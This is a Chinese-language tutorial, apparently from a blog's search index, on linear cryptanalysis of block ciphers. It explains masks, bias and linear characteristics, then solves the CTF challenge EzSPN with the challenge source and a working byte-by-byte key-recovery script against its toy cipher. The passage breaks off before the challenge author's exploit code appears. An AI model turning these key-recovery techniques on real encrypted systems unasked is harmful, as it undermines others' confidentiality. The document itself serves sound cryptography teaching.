<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>密码学学习笔记 之 线性分析入门篇——EzSPN</title>
      <link href="/2021/08/06/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%BA%BF%E6%80%A7%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%E7%AF%87%E2%80%94%E2%80%94EzSPN/"/>
      <url>/2021/08/06/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%BA%BF%E6%80%A7%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%E7%AF%87%E2%80%94%E2%80%94EzSPN/</url>
      
        <content type="html"><![CDATA[<p>首发于<a href="https://www.anquanke.com/post/id/250029" target="_blank" rel="noopener">安全客</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上一篇了解了一下差分分析，这次我们结合一道CTF题目聊一聊线性分析</p><p>同属于选择明文的差分分析不同，线性分析属于已知明文攻击方法，它通过寻找明文和密文之间的一个“有效”的线性逼近表达式，将分组密码与随机置换区分开来，并再此基础上进行密钥恢复攻击。</p><p>在正式介绍线性分析之前，我们还是要介绍一下相关的基础概念，参考《分组密码的攻击方法与实例分析》一书</p><h1 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h1><p>首先还是给出和差分分析一样的一个迭代分组密码的加密流程</p><h3 id="迭代分组密码的加密流程"><a href="#迭代分组密码的加密流程" class="headerlink" title="迭代分组密码的加密流程"></a><strong>迭代分组密码的加密流程</strong></h3><p>假设所讨论的迭代分组密码为</p><p>$E:{0,1}^n × {0,1}^l \rightarrow {0,1}^n$，</p><p>其中 $n$ 为分组长度， $l$ 为密钥长度，任给 $k \in {0,1}^l, E(\cdot,k)$ 是 ${0,1}^n$ 上的置换，加密函数 $E_k(\cdot)$ 由子密钥 $k_i$ 控制的轮函数 $F(\cdot,k_i) = F _ {k _ i}(\cdot)$ 迭代 $r$ 次生成，即</p><p>$E_ k(x)=F _ {k _ r} \circ F _ { k _ {r-1}} \circ \cdots \circ F _ {k _ {2}} \circ F _ {k _ {1}(x)}$ </p><p>其中，轮密钥 $k_i,i=1,2,\cdots,r,$ 由密钥拓展算法对种子密钥 $k$ 进行拓展生成，为方便起见，假设第 $i$ 轮输入和输出分别为 $Y_{i-1}$ 和 $Y_i$，即 $Y_i = F_ {k _i}(Y _ {i-1})$；若明文为$X$ ，则第一轮输入为 $Y_0 = X$；若该分组密码算法有 $r$ 轮，且设密文为 $Z$，则 $Z = Y_r$</p><p><img src="https://i.loli.net/2021/07/16/c6fw2oDg43kVPbv.png" alt="image-20210716094603863"></p><h3 id="内积"><a href="#内积" class="headerlink" title="内积"></a>内积</h3><p>设 $a,b \in {0,1}^n, a = (a_1,a_2,\dots, a_n),b = (b_1,b_2,\dots,b_n),$ 向量 a 与 b 的内积定义为 $a \cdot b = \oplus a_i \cdot b_i ,i \in [1,n]$, 其中 $a_i \cdot b_i$ 表示比特 $a_i$ 与 $b_i$ 的与运算，即二元域$\mathbb{F}_2$ 上的乘法运算，$\oplus$ 表示异或运算，即二元域$\mathbb{F}_2$ 上的加法运算</p><h3 id="线性掩码"><a href="#线性掩码" class="headerlink" title="线性掩码"></a>线性掩码</h3><p>（这是一个比较重要的概念）</p><p>设$X \in {0,1}^n$，$X$ 的线性掩码定义为某个向量$\Gamma X \in {0,1}^n, \Gamma X $ 和 $X$ 的内积代表 $X$ 的某些分量的线性组合，即 $\Gamma X \cdot X = {\oplus X_i | \Gamma X_i = 1} $</p><p>可以举个简单的例子，比如$X = (0,1,1,0,0,1,1,0)$，$\Gamma X = 6 = 0b110={0,0,0,0,0,1,1,0}$，所以$\Gamma X \cdot X $ 就代表着 $X$ 的第六，第七两个元素的值相互异或，也就是$\Gamma X \cdot X = X_5 \oplus X_6 = 1\oplus 1 = 0$</p><h3 id="线性逼近表达式"><a href="#线性逼近表达式" class="headerlink" title="线性逼近表达式"></a>线性逼近表达式</h3><p>设迭代分组密码的轮函数为$F(x,k)$，给定一对线性掩码 $(\alpha,\beta)$，称$\alpha \cdot x \oplus \beta \cdot F(x,k)$ 为 $F(x,k)$ 的线性逼近表达式，同样，称$a \cdot x \oplus \beta \cdot E(x,k)$ 为分组密码 $E(x,k)$ 的线性逼近表达式。</p><p>假设$p(\alpha,\beta) = Prob_{X,K}{ \alpha \cdot X = \beta \cdot F(x,k)},$ 则 $p$ 表示线性逼近表达式 $\alpha \cdot X \oplus \beta \cdot F(X,K) = 0$ 的概率，在线性密码分析中，一般采用偏差、相关性和势的概念来描述逼近表达式的概率特性，依次定义为 </p><p>$\epsilon _ F(\alpha,\beta) = p(\alpha,\beta)-\frac{1}{2}$</p><p>$Cor _ F(\alpha,\beta) = 2p(\alpha,\beta)-1$</p><p>$Pot _ F(\alpha,\beta) = (p(\alpha,\beta)-\frac{1}{2})^2$</p><p>将掩码$(\alpha,\beta)$所对应的线性逼近表达式的线性概率定义为 $LP(\alpha,\beta) = (2 \cdot Prob_{X,K}{ \alpha \cdot X = \beta \cdot F(x,k)}-1)^2$</p><p>研究线性表达式的概率特性可以简单地描述为研究一对线性掩码的概率特性，即输入掩码 $\alpha$ 到 输出掩码 $\beta$ 的概率传播特性。</p><h3 id="线性壳"><a href="#线性壳" class="headerlink" title="线性壳"></a>线性壳</h3><p>迭代分组密码的一条 $i$ 轮线性壳是指一对掩码$(\beta_0,\beta_i)$，其中$\beta_0$ 是输入掩码，$\beta_i$ 是输出掩码。</p><h3 id="线性特征"><a href="#线性特征" class="headerlink" title="线性特征"></a>线性特征</h3><p>迭代分组密码的一条$i$ 轮线性特征$\Omega = (\beta_0,\beta_i,\cdots , \beta_i)$ 是指当掩码为$\beta_0$ 在 $i$ 轮加密的过程中，中间状态$Y_j$ 的掩码为$\beta_j$，其中 $1 \le j \le i.$</p><p>线性特征和线性壳的区别在于，线性壳仅仅给定了输入掩码和输入掩码，中间状态的掩码值未指定；而线性特征不仅给定了输入输出掩码，还指定了中间状态的掩码值。</p><h3 id="线性壳的线性概率"><a href="#线性壳的线性概率" class="headerlink" title="线性壳的线性概率"></a>线性壳的线性概率</h3><p>迭代分组密码的一条 $i$ 轮线性壳$(\beta_0,\beta_i)$的线性概率 $LP(\alpha,\beta)$ 也可记为 $LP(\alpha \rightarrow \beta)$，是指在输入 $X$, 轮密钥 $K_1,K_2,\cdots,K_i$ 取值独立且均匀分布的情形下，当输入掩码为$\beta_0$ ，在经过$i$ 轮加密后，输出掩码为$\beta_i$ 的线性概率。</p><h3 id="线性特征的线性概率"><a href="#线性特征的线性概率" class="headerlink" title="线性特征的线性概率"></a>线性特征的线性概率</h3><p>类比于线性壳的线性概率，当输入掩码为$\beta_0$，在加密过程中，中间状态$Y_j$ 的掩码取值为$\beta_j$ 的线性概率，其中 $1 \le j \le i$。</p><p>好的，有了如上的前置知识，我们来讲讲我们如何用线性分析来区别随机置换$\mathcal{R}$  和分组密码。</p><h1 id="线性区分器"><a href="#线性区分器" class="headerlink" title="线性区分器"></a>线性区分器</h1><p>先给出一个命题，对${0,1}^n $上的随机置换$\mathcal{R}$,任意给定掩码$\alpha,\beta,\alpha \neq 0,\beta \neq0,$ 则 $LP(\alpha,\beta ) = 0,$ 即 偏差$\epsilon(\alpha,\beta) = 0$</p><p>如果我们找到了一条 $r-1$ 轮线性逼近表达式 $(\alpha,\beta)$，其线性概率$LP(\alpha,\beta) \neq 0$，即偏差$\epsilon(\alpha,\beta) \neq 0$。则利用该线性逼近表达式可以将 $r-1$ 轮的加密算法与随即置换区分开来，利用该线性区分器就可以对分组密码进行密钥恢复攻击。假设攻击 $r$ 轮加密算法，为获得第 $r$ 轮 的轮密钥的攻击步骤如下。</p><h3 id="步骤1"><a href="#步骤1" class="headerlink" title="步骤1"></a>步骤1</h3><p>寻找一个 $r - 1$轮的线性逼近表达式$(\alpha,\beta)$，设其偏差为$\epsilon$，使得 $|\epsilon(\alpha,\beta)|$ 较大。</p><h3 id="步骤2"><a href="#步骤2" class="headerlink" title="步骤2"></a>步骤2</h3><p>根据区分器的输出，攻击者确定要恢复的第 $r$ 轮轮密钥 $k_r$（或者其部分比特）：设攻击的密钥比特长度为 $l$，对每个可能的候选密钥$gk_i, 0 \le i \le 2^l -1$，设置相应的 $2^l$ 个计数器 $\lambda_i$，并初始化。</p><h3 id="步骤3"><a href="#步骤3" class="headerlink" title="步骤3"></a>步骤3</h3><p>均匀随机地选取明文 $X$，在同一个未知密钥 $k$ 下加密，（一般是让拥有密钥地服务端帮你加密）获得相应地密文 $Z$, 这里选择明文地数目为 $m \approx c \cdot \frac{1}{\epsilon ^2}$，$c$ 为某个常数。</p><h3 id="步骤4"><a href="#步骤4" class="headerlink" title="步骤4"></a>步骤4</h3><p>对一个密文$Z$，我们用自己猜测地第 $r$ 轮轮密钥 $gk_i$（或其部分比特）对其进行第 $r$ 轮解密得到$Y_{r-1}$，然后我们计算线性逼近表达式 $\alpha x \cdot X \oplus \beta \cdot Y_{r-1}$ 是否为0，若成立，则给相应计数器$\lambda_i$ 加 1</p><h3 id="步骤5"><a href="#步骤5" class="headerlink" title="步骤5"></a>步骤5</h3><p>将 $2^l$ 个计数器中$|\frac{\lambda_i}{m} - \frac{1}{2}|$ 最大地指所对应地密钥 $gk_i$（或其部分比特）作为攻击获得地正确密钥值。</p><p><strong>Remark</strong> 针对步骤1中，我们如何去寻找一个高概率地 $r -1 $ 轮线性逼近表达式呢？例如针对一个S盒，我们可以选择穷举所有的输入、并获得相应的输出，然后穷举输入掩码、输出掩码，去获取这个S盒的相关线性特性。</p><p>下面就根据一道CTF中出现的赛题来解释分析上述过程。</p><h2 id="实例-NPUCTF2020-EzSPN"><a href="#实例-NPUCTF2020-EzSPN" class="headerlink" title="实例-[NPUCTF2020]EzSPN"></a>实例-[NPUCTF2020]EzSPN</h2><p>task.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">import</span> Crypto.Random.random <span class="keyword">as</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">SZ = <span class="number">8</span></span><br><span class="line">coef = [<span class="number">239</span>, <span class="number">163</span>, <span class="number">147</span>, <span class="number">71</span>, <span class="number">163</span>, <span class="number">75</span>, <span class="number">219</span>, <span class="number">73</span>]</span><br><span class="line">sbox = list(range(<span class="number">256</span>))</span><br><span class="line">random.shuffle(sbox)</span><br><span class="line">sboxi = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    sboxi.append(sbox.index(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">doxor</span><span class="params">(l1,l2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [x[<span class="number">0</span>]^x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> zip(l1,l2)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span><span class="params">(blk)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>, SZ, <span class="number">8</span>):</span><br><span class="line">        bits = [bin(x)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">'0'</span>) <span class="keyword">for</span> x <span class="keyword">in</span> blk[k:k+<span class="number">8</span>]]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            res.append(int(<span class="string">''</span>.join([x[(i+<span class="number">1</span>) % <span class="number">8</span>] <span class="keyword">for</span> x <span class="keyword">in</span> bits]),<span class="number">2</span>))</span><br><span class="line">        res[k:k+<span class="number">8</span>] = [(coef[i] * res[k+i]) % <span class="number">256</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>)]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_block</span><span class="params">(pt, ks)</span>:</span></span><br><span class="line">    cur = doxor(pt, ks[:SZ])</span><br><span class="line">    cur = [sbox[x] <span class="keyword">for</span> x <span class="keyword">in</span> cur]</span><br><span class="line">    cur = trans(cur)</span><br><span class="line">    cur = [sboxi[x] <span class="keyword">for</span> x <span class="keyword">in</span> cur]</span><br><span class="line">    cur = doxor(cur, ks[SZ:])</span><br><span class="line">    <span class="keyword">return</span> cur</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(pt, k)</span>:</span></span><br><span class="line">    x = <span class="number">0</span> <span class="keyword">if</span> len(pt)%SZ==<span class="number">0</span> <span class="keyword">else</span> (SZ-len(pt)%SZ)</span><br><span class="line">    pt += [x]*x</span><br><span class="line">    ct = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(pt), SZ):</span><br><span class="line">        res = encrypt_block([x <span class="keyword">for</span> x <span class="keyword">in</span> pt[i:i+SZ]], k)</span><br><span class="line">        ct += <span class="string">''</span>.join([<span class="string">"&#123;:02x&#125;"</span>.format(xx) <span class="keyword">for</span> xx <span class="keyword">in</span> res])</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">doout</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(x) % <span class="number">16</span>:</span><br><span class="line">        x = (<span class="number">16</span> - len(x) % <span class="number">16</span>) * <span class="string">"0"</span> + x</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">doin</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> list(unhexlify(x))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genkeys</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> list(os.urandom(<span class="number">2</span>*SZ))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(sbox)</span><br><span class="line">    key = genkeys()</span><br><span class="line">    ct = encrypt(flag, key)</span><br><span class="line">    print(ct)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        pt = doin(input())</span><br><span class="line">        print(doout(encrypt(pt, key)))</span><br></pre></td></tr></table></figure><p>题目提供一个交互，能够加密你的输入并返回密文。所以这里是否可以采用差分分析的攻击方法呢，但这里我们讨论的线性分析，所以我们就用线性分析来做这道题目里。</p><p>那么看到这里所用加密系统的流程。</p><p>关键函数是encrypt_block(pt, ks)，</p><p>首先是一个明文和一半的密钥异或，然后是进入S盒（题目每次随机生成并提供S盒具体内容），然后trans一下，再进入一个逆S盒，最后再和另一半的密钥异或。</p><p>看到这个trans函数，这里有一个int(‘’.join([x[(i+1) % 8] for x in bits]),2)，这个（i+1%8）有点类似位移的效果，然后是乘以了一个系数，但这个系数已经定死了，所以没有什么关系。</p><p>首先测一个这个trans函数的一个位移效果，大概类似这样</p><p><img src="https://i.loli.net/2021/08/06/UZGgqeIWRouP2A8.png" alt="image-20210806135326890"></p><p>然后整个流程图（画的丑了点）<img src="https://i.loli.net/2021/08/10/KxArtmd2UP91SIE.png" alt="image-20210806142706120"></p><p>那么针对这道题，我们利用线性分析攻击手法，</p><p>首先<strong>步骤1</strong>，我们去分析S盒的线性特性以找到使得线性表达式偏差大的掩码对$(\alpha，\beta)$。我们穷举所有的S盒的可能的输入并计算出相应的输出，然后穷举所有的输入、输出掩码的组合，然后根据其是否符合满足线性逼近表达式 $\alpha \cdot X \oplus \beta \cdot F(X,K) = 0$ 来更新计数器，最后我们计算相应的偏差表offset</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">def linearSbox():</span><br><span class="line">    <span class="built_in">global</span> linearInput</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        si = sbox[i]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">                <span class="keyword">a</span> = bitxor(i, j) <span class="comment"># 线性估计输入</span></span><br><span class="line">                b = bitxor(si, k) <span class="comment"># 线性估计输出 </span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">a</span> == b:</span><br><span class="line">                    <span class="built_in">offset</span>[j][k] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="built_in">offset</span>[i] = [<span class="built_in">abs</span>(x - <span class="number">128</span>) / <span class="number">256</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">offset</span>[i]]</span><br><span class="line">    <span class="keyword">for</span> linearOutput <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        cur = [x[linearOutput] <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">offset</span>]</span><br><span class="line">        linearInput.append(cur.index(<span class="built_in">max</span>(cur)))</span><br></pre></td></tr></table></figure><p>其中j是输入掩码，k是输出掩码。</p><p>这里的offset以输入掩码为行，输出掩码为列，所以这里的cur是获取同一输出掩码下不同输入掩码的偏差</p><p><strong>并且在linearInput中记录下同一输入掩码下使得线性表达式偏差最大的输出掩码。</strong></p><p>这里我们简单看一下输出的offset表</p><p><img src="https://i.loli.net/2021/08/09/n4pJ5iLtaZDrfPx.png" alt="image-20210809171058522"></p><p>可以看到列表的第一行很特殊，除了第一个是0.5这个极大的值以外，其他都是0。因为在输入掩码为0、输出掩码也为0的话，肯定是能够满足的情况下，针对所有的输入、输出肯定是都能满足线性逼近表达式的，所以偏差达到了最大，0.5。但是换做其他输出掩码的话，针对所有的输出，其最后的表达式的结果分布得很均匀，所以偏差为0。</p><p>再举第二行第一列的0.03131…这个值的含义：就是针对所有的256个输入，当输入掩码为1，输出掩码为1时的线性逼近表达式的偏差。即有 256 * （0.03+0.5） ≈ 135 个输入满足（或者不满足）这个线性逼近表达式。</p><p>有了S盒的线性特性之后，<strong>步骤2</strong>是设置一个计数器conter，然后我们开始进入<strong>步骤3</strong>搜集明文密文对。就随机选择明文，发送给服务端，然后接收服务端返回的密文即可。</p><p>接着开始<strong>步骤4</strong>，由于这里有两轮加密，然后我们在步骤1已经生成了关于单个S盒的一个offset表，这个就相当于是 $1$ 轮线性特征了，那么我们接下来就按照线性分析的攻击思路，</p><p>这里我们按字节猜测密钥，首先拿一个密文的第一个字节，异或第一个字节的密钥（枚举）后从S逆盒出去，然后把系数cof除掉，再根据P盒，把这个值换到相应的位置，然后这里我们根据S盒的线性特征选取合适的输出、输入掩码对我们的这对输入进行测试。若满足线性逼近表达式，则True计数加一，否则False计数加一。</p><p>最后<strong>步骤5</strong>，针对每个字节我们都测一万对，取结果偏差最大的key值。这样就完成了密钥每个字节的猜测。</p><p>结合代码再细细讲一遍</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">def calcOffset(pt, <span class="keyword">ct</span>, j, guessed_key):  # 猜测第j段子密钥</span><br><span class="line">    pt = <span class="keyword">list</span>(unhexlify(pt))</span><br><span class="line">    <span class="keyword">ct</span> = <span class="keyword">list</span>(unhexlify(<span class="keyword">ct</span>))</span><br><span class="line">    <span class="keyword">ct</span>[j] ^= guessed_key</span><br><span class="line">    <span class="keyword">ct</span>[j] = sbox[<span class="keyword">ct</span>[j]] # sbox即为sboxi的逆</span><br><span class="line">    <span class="keyword">ct</span>[j] = (<span class="keyword">ct</span>[j] * coef[j]) % 256</span><br><span class="line">    u1 = bitxor(pt[0], linearInput[1 &lt;&lt; ((6 - j) % 8)])</span><br><span class="line">    u2 = bitxor(<span class="keyword">ct</span>[j], 0b10000000)</span><br><span class="line">    <span class="keyword">if</span> u1 == u2:</span><br><span class="line">        <span class="keyword">return</span> True</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def linearAttack():</span><br><span class="line">    key2 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(8): # 第二轮子密钥的第i段</span><br><span class="line">        <span class="keyword">count</span> = [0 <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="keyword">range</span>(256)]</span><br><span class="line">        <span class="keyword">for</span> guessed_key <span class="keyword">in</span> <span class="keyword">range</span>(256):</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">"[+] Cracking key...(&#123;&#125;-&#123;&#125;)"</span>.<span class="keyword">format</span>(i, guessed_key))</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="keyword">range</span>(10000):</span><br><span class="line">                <span class="keyword">if</span> calcOffset(plain[j], cipher[j], i, guessed_key) == True:</span><br><span class="line">                    <span class="keyword">count</span>[guessed_key] += 1</span><br><span class="line">        bias = [<span class="built_in">abs</span>(x - 5000) / 10000 <span class="keyword">for</span> x <span class="keyword">in</span> <span class="keyword">count</span>]</span><br><span class="line">        key2.<span class="keyword">append</span>(bias.<span class="built_in">index</span>(<span class="built_in">max</span>(bias)))</span><br><span class="line">    <span class="keyword">return</span> key2</span><br></pre></td></tr></table></figure><p>linearAttack()中我们主要关注那个循环。这里调用了calcOffset函数，传入了一对明文密文对（plain[j], cipher[j]）、索引（i）、以及猜测的密钥（guessed_key）。</p><p>在calcOffset中，首先用密文异或了guessed_key，然后根据值获取从Sbox的输入，然后乘以了coef（这里已经是原来coef的逆了），接着是u2 = bitxor(ct[j], 0b10000000)，用了0b10000000作为掩码，即选取了密文的第一个bit。然后选取 linearInput[1 &lt;&lt; ((6 - j) % 8)] 做为明文第一个字节的掩码。</p><p>为什么只选明文的第一个字节，以及其掩码的选取这里可能看的不是很直观，因为这里其实包含了两部分。</p><p>我们需要回去注意到P盒。当这里j=0，即爆破第一个字节的密钥时，我们选取的是密文的第1个字节，掩码选的是第1个bit，那么这是从P盒输入的哪个bit传来的呢，从P盒我们可以看到这是P盒输入的第一个字节的第2bit传来的，那么P盒输入的第2bit，实际上就是S盒输出的第2bit，也就是S盒的输出掩码为0b01000000，也就是1 &lt;&lt; 6。而这个 linearInput 存的就是<strong>输出掩码为某个值的使得线性逼近表达式偏差最大的输入掩码</strong>。</p><p><img src="https://i.loli.net/2021/08/10/XwUzR6DlbWJFiu1.png" alt="image-20210810092540611"></p><p>当我们选取密文第二个字节的时候，根据P盒，第二个字节第1个bit来自于明文第一个字节第3个bit，也就是0b00100000，也就是1 &lt;&lt; 5，同理可推</p><p>所以这里只用选明文的第一个字节，密文不同字节的第一个比特，且输入掩码为 linearInput[1 &lt;&lt; ((6 - j) % 8)]。</p><p>另外可能还有一个问题，S盒的输入不是明文啊，应该是明文异或了第一个段密钥。确实，但是试想一下，在线性逼近表达式的这个式子中，密钥部分相互异或后，最后无非就是0或者1，而且由于密钥固定，所以针对固定的输入掩码，这个值是固定的。对于返回结果没有影响或者只是一个取反的效果。而我们是根据偏移来判断的，所以正并不影响结果，key的具体的值在这里也就没什么影响。</p><p>举个例子，如果输入掩码是0b00110011，输入掩码是0b00001111，那么由于密钥的存在，线性逼近表达式就是这么写：$X_2 \oplus X_3 \oplus X_6\oplus X_7 \oplus K_2 \oplus K_3\oplus K_6\oplus K_7 = Y_4\oplus Y_5 \oplus Y_6 \oplus Y_7$</p><p>其中$K_2 \oplus K_3\oplus K_6\oplus K_7$ 这部分无非就是等于 0 或者 1，对于结果没有影响或者只是一个取反的效果，对偏差则没有影响。</p><p>爆破出第二部分key的每一个字节之后，我们就可以逆算法流程。由于S盒是双射的，用明文、密文、第二部分key就可以去恢复第一部分的key，然后再写一个解密函数就可以解决这道问题了，</p><p>来自出题人的exp:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span 